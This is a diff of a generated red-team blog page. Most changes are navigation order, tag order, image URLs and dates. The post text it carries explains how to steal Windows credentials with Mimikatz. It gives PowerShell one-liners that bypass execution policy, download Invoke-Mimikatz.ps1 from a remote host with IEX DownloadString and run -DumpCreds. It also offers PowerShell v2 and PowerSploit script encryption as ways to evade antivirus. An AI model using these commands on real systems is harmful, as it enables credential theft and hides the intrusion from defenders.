@@ -98,33 +98,22 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>About</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>Contact</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/friends" class="waves-effect waves-light">
       
       <i class="fas fa-address-book" style="zoom: 0.6;"></i>
       
       <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
     </a>
     
   </li>
@@ -201,33 +190,22 @@
         
         <li class="m-nav-item">
 	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			About
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			Contact
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/friends" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-address-book"></i>
 			
 			Friends
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
 		</a>
           
         </li>
@@ -308,10 +286,23 @@
 </header>
 
     
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/6.png')">
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20catch%20password/6.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -436,20 +427,20 @@
                                 <span class="chip bg-color">Redteam</span>
                             </a>
                         
-                            <a href="/tags/Mimikatz/">
-                                <span class="chip bg-color">Mimikatz</span>
-                            </a>
-                        
                             <a href="/tags/Bypass/">
                                 <span class="chip bg-color">Bypass</span>
                             </a>
                         
-                            <a href="/tags/Catch-Password/">
-                                <span class="chip bg-color">Catch Password</span>
+                            <a href="/tags/Mimikatz/">
+                                <span class="chip bg-color">Mimikatz</span>
                             </a>
                         
                             <a href="/tags/Powershell/">
                                 <span class="chip bg-color">Powershell</span>
+                            </a>
+                        
+                            <a href="/tags/Catch-Password/">
+                                <span class="chip bg-color">Catch Password</span>
                             </a>
                         
                     </div>
@@ -480,7 +471,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-08-11
+                    2021-09-10
                 </div>
                 
 
@@ -523,19 +514,19 @@
 
 Get-executionpolicy indicates that the current policy is Restricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/1.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20catch%20password/1.png"></p>
 <pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">You can change the execution policy with the administrator permission<span class="token punctuation">.</span> <span class="token keyword">Do</span> not ask me why I have the administrator permission<span class="token punctuation">.</span> You can not <span class="token keyword">catch</span> passwords with the normal user
 
 <span class="token function">Set-ExecutionPolicy</span> Unrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/2.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20catch%20password/2.png"></p>
 <h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="PSV2"><a href="#PSV2" class="headerlink" title="PSV2"></a>PSV2</h3><pre class="line-numbers language-none"><code class="language-none">as we all known the easy way like this
 powershell -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.1:8888&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;
 
 now you can use the v2 maybe can bypass some av like this
 powershell -Version 2 -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.1:8888&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/3.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20catch%20password/3.png"></p>
 <h3 id="Encode-script"><a href="#Encode-script" class="headerlink" title="Encode script"></a>Encode script</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">as we all know the Powersploit project<span class="token punctuation">,</span> how about use this project to bypass?
 
 Here we use the <span class="token function">out-encryptedScript</span> to place the script in the same directory as the MimiKatz script<span class="token punctuation">,</span> and then encrypt it in turn
@@ -543,7 +534,7 @@ Here we use the <span class="token function">out-encryptedScript</span> to place
 <span class="token function">Import-Module</span> <span class="token punctuation">.</span>\<span class="token function">Out-EncryptedScript</span><span class="token punctuation">.</span>ps1
 <span class="token function">Out-EncryptedScript</span> <span class="token operator">-</span>ScriptPath <span class="token punctuation">.</span>\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1 <span class="token operator">-</span>Password woshijiamide <span class="token operator">-</span>Salt safety<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/4.png">```</p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20catch%20password/4.png">```</p>
 <pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">let our ps1script up to our tar then like this
 
 powershell<span class="token punctuation">.</span>exe
@@ -554,12 +545,12 @@ powershell<span class="token punctuation">.</span>exe
 <span class="token function">Invoke-Expression</span> <span class="token variable">$decrypted</span>
 <span class="token function">Invoke-Mimikatz</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/5.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20catch%20password/5.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">the same way, Of course, both files are put remote, also does not affect the final effect 
 
 maybe will get some wrong, but we also can catch PW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/6.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20catch%20password/6.png"></p>
 
                 
             </div>
@@ -628,20 +619,20 @@ maybe will get some wrong, but we also can catch PW<span aria-hidden="true" clas
                                     <span class="chip bg-color">Redteam</span>
                                 </a>
                             
-                                <a href="/tags/Mimikatz/">
-                                    <span class="chip bg-color">Mimikatz</span>
-                                </a>
-                            
                                 <a href="/tags/Bypass/">
                                     <span class="chip bg-color">Bypass</span>
                                 </a>
                             
-                                <a href="/tags/Catch-Password/">
-                                    <span class="chip bg-color">Catch Password</span>
+                                <a href="/tags/Mimikatz/">
+                                    <span class="chip bg-color">Mimikatz</span>
                                 </a>
                             
                                 <a href="/tags/Powershell/">
                                     <span class="chip bg-color">Powershell</span>
+                                </a>
+                            
+                                <a href="/tags/Catch-Password/">
+                                    <span class="chip bg-color">Catch Password</span>
                                 </a>
                             
                         </div>
@@ -694,7 +685,7 @@ maybe will get some wrong, but we also can catch PW<span aria-hidden="true" clas
                 <a href="/2021/08/01/a-solution-to-the-failure-of-the-trust-relationship-between-this-workstation-and-the-primary-domain/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801231855683.png" class="responsive-img" alt="A solution to the failure of the trust relationship between this workstation and the primary domain">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801231855683.png" class="responsive-img" alt="A solution to the failure of the trust relationship between this workstation and the primary domain">
                         
                         <span class="card-title">A solution to the failure of the trust relationship between this workstation and the primary domain</span>
                     </div>
@@ -746,7 +737,7 @@ maybe will get some wrong, but we also can catch PW<span aria-hidden="true" clas
                 <a href="/2021/07/30/exchange-export-email-methods/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.29.png" class="responsive-img" alt="Exchange Export email methods">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.29.png" class="responsive-img" alt="Exchange Export email methods">
                         
                         <span class="card-title">Exchange Export email methods</span>
                     </div>
@@ -1024,7 +1015,7 @@ maybe will get some wrong, but we also can catch PW<span aria-hidden="true" clas
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2021</span>
+                <span id="year">2021-2022</span>
             
             <span id="year">2021</span>
             <a href="/about" target="_blank">Yangsir</a>
@@ -1033,7 +1024,7 @@ maybe will get some wrong, but we also can catch PW<span aria-hidden="true" clas
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">13.8k</span>&nbsp;字
+                class="white-color">62.8k</span>&nbsp;字
             
             
             
